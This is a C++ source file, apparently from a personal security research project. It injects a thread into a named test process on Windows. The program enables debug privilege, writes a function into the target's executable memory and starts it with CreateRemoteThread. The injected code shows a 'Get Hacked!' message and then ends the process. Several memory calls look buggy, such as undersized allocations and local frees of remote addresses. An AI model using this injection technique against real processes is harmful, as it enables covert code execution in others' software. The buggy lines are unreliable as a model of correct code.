/*
 * Console Win32 Remote Thread Injector
 * main.cpp
 *
 * Matthew Todd Geiger
 * 10/22/2018
 * 06:35
 * #214
 *
 * WARNING: This program is very delicate and slight changes seem to cause
 *			write violations. Make sure to open up the test program before you
 *			launch this code. The program I wrote as the test dummy for this project
 *			is located in the "Thread Injector Dummy" folder.
 * 
 * This program was built for the Project
 * "The Breathtaking Security of Windows :: DLL Injector Planning and Research"
 */

#pragma once
//#include <iostream>				// Do Not include this library! for some reason iostream causes a write access violation
#include <Windows.h>  
#include <TlHelp32.h>  
#include "stdio.h"

typedef struct _RemoteParam {
	//HWND hWnd;				//add		
	char szMsg[64]; 
	char szCap[64];
	char szPrint[64];
	char szInstruction[64];
	//int iVirtKey;				//add
	//DWORD dwGetConsoleWindow;	//add
	//DWORD dwGetKeyState;		//add
	DWORD dwSleepData;
	DWORD dwSleep;
	DWORD dwPrintf;
	DWORD dwMessageBox; 
	DWORD dwExitProcess;
} RemoteParam, * PRemoteParam;

typedef HWND(__stdcall* PFN_GETCONSOLEWINDOW)(void);

typedef void(__stdcall* PFN_SLEEP)(DWORD);

typedef short(__stdcall* PFN_GETKEYSTATE)(int);

typedef int(__stdcall* PFN_PRINTF)(const char *, ...);

typedef int (__stdcall* PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);

typedef int (__stdcall* PFN_EXITPROCESS)(UINT);

DWORD __stdcall threadProc(LPVOID lParam)  
{  
	RemoteParam* pRP = (RemoteParam*)lParam;  
	PFN_MESSAGEBOX pfnMessageBox;  
	pfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;

	pfnMessageBox(NULL, pRP->szMsg, pRP->szCap, 0);

	PFN_PRINTF pfnPrintf;
	pfnPrintf = (PFN_PRINTF)pRP->dwPrintf;
	pfnPrintf(pRP->szPrint);
	pfnPrintf(pRP->szInstruction);

	PFN_SLEEP pfnSleep;
	pfnSleep = (PFN_SLEEP)pRP->dwSleep;

	/*PFN_GETKEYSTATE pfnGetKeyState;
	pfnGetKeyState = (PFN_GETKEYSTATE)pRP->dwGetKeyState;

	PFN_GETCONSOLEWINDOW pfnGetConsoleWindow;
	pfnGetConsoleWindow = (PFN_GETCONSOLEWINDOW)pRP->dwGetConsoleWindow;

	pRP->hWnd = pfnGetConsoleWindow();
	while(true) {
		if((pfnGetKeyState(pRP->iVirtKey) & 0x100) != 0) {
			BringWindowToTop(pRP->hWnd);
			break;
		}
	}*/

	pfnSleep(pRP->dwSleepData);

	PFN_EXITPROCESS pfnExitProcess;
	pfnExitProcess = (PFN_EXITPROCESS)pRP->dwExitProcess;
	pfnExitProcess(0);

	return 0;  
}  

bool enableDebugPriv()  
{  
	HANDLE hToken;  
	LUID sedebugnameValue;  
	TOKEN_PRIVILEGES tkp;  

	if (!OpenProcessToken(GetCurrentProcess(),   
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {  
			return false;  
	}  
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {  
		CloseHandle(hToken);  
		return false;  
	}  
	tkp.PrivilegeCount = 1;  
	tkp.Privileges[0].Luid = sedebugnameValue;  
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {  
		CloseHandle(hToken);  
		return false;  
	}  
	return true; 
}

void Pause(char *szMsg) {
	printf("%s", szMsg);
	Sleep(1500);

	for(int i = 0; i < 255; i++) {
		if(GetAsyncKeyState(i) >> 15) {
			if(i != 1 && i != 2 && i != 18 && i != 9) {
				if ((!GetAsyncKeyState(18) && !GetAsyncKeyState(9)) & 1){
					break;
				}
			}
		}

		if(i == 244) {
			i = 0;
		}
	}
}

int main(int argc, char *argv[]) {
	HWND hWnd;
	hWnd = GetConsoleWindow();

	RECT childRect;
	ZeroMemory(&childRect, sizeof(RECT));
	GetClientRect(hWnd, &childRect);

	int width = childRect.right - childRect.left;
	int height = childRect.bottom - childRect.top;

	HWND hDesktopWnd;
	hDesktopWnd = GetDesktopWindow();

	RECT parentRect = {0, 0, 0, 0};
	GetClientRect(hDesktopWnd, &parentRect);

	int centerX = (parentRect.right) - (width);
    int centerY = (parentRect.bottom/2) - (height + 35);
	
	BringWindowToTop(hWnd);
	MoveWindow(hWnd, centerX, centerY, width, height, true);

	const DWORD dwThreadSize = 9920;
	DWORD dwWriteBytes;
	DWORD dwProcessId = NULL;

	char *prgName = "mttest.exe";

	enableDebugPriv();

	PROCESSENTRY32 pEntry = {sizeof(PROCESSENTRY32)};
	HANDLE hProcessList = NULL;
	DWORD processId = NULL;

	printf("Searching for %s\n", prgName);
	while(!processId) {
		hProcessList = CreateToolhelp32Snapshot(PROCESS_ALL_ACCESS, 0);

		if(Process32First(hProcessList, &pEntry)) {
			do {
				if(!strcmp(pEntry.szExeFile, prgName)) {
					processId = pEntry.th32ProcessID;
					printf("%s has been found | PID: %d\n", prgName, processId);
					break;
				}
			} while(Process32Next(hProcessList, &pEntry));
		}
	}

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);

	void* memAddress = VirtualAllocEx(hProc, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProc, memAddress, &threadProc, dwThreadSize, NULL);

	RemoteParam tParam;
	ZeroMemory(&tParam, sizeof(RemoteParam));

	HINSTANCE hLibc = LoadLibrary("msvcrt.dll");
	HINSTANCE hU32 = LoadLibrary("User32.dll");
	HINSTANCE hK32 = LoadLibrary("Kernel32.dll");

	//tParam.dwGetConsoleWindow = (DWORD)GetProcAddress(hK32, "GetConsoleWindow");
	//tParam.dwGetKeyState = (DWORD)GetProcAddress(hU32, "GetKeyState");
	tParam.dwSleep = (DWORD)GetProcAddress(hK32, "Sleep");
	tParam.dwPrintf = (DWORD)GetProcAddress(hLibc, "printf");
	tParam.dwMessageBox = (DWORD)GetProcAddress(hU32, "MessageBoxA");
	tParam.dwExitProcess = (DWORD)GetProcAddress(hK32, "ExitProcess");

	//tParam.hWnd = NULL;
	//tParam.iVirtKey = VK_LBUTTON;
	tParam.dwSleepData = 5000;

	strcat_s(tParam.szInstruction, "Click on another screen\n\0");
	strcat_s(tParam.szPrint, "Get Hacked!\n\0");
	strcat_s(tParam.szCap, "Remote Thread Injection\0");
	strcat_s(tParam.szMsg, "Injected Process!\0");

	RemoteParam *memStruct = (RemoteParam *)VirtualAllocEx(hProc, 0, sizeof(RemoteParam *), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProc, memStruct, &tParam, sizeof(tParam), NULL);

	VirtualProtect(memAddress, sizeof(RemoteParam *), PAGE_READWRITE, NULL);

	CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)memAddress, memStruct, 0, &dwWriteBytes);

	FreeLibrary(hLibc);
	FreeLibrary(hK32);
	FreeLibrary(hU32);

	VirtualFree(memAddress, dwThreadSize, MEM_DECOMMIT);
	VirtualFree(memStruct, sizeof(RemoteParam *), MEM_DECOMMIT);

	Pause("Press Any Key To Exit...");

	CloseHandle(hProcessList);
	CloseHandle(hProc);
	//CloseHandle(hWnd);			You cannot close window handles...

	return 0;
}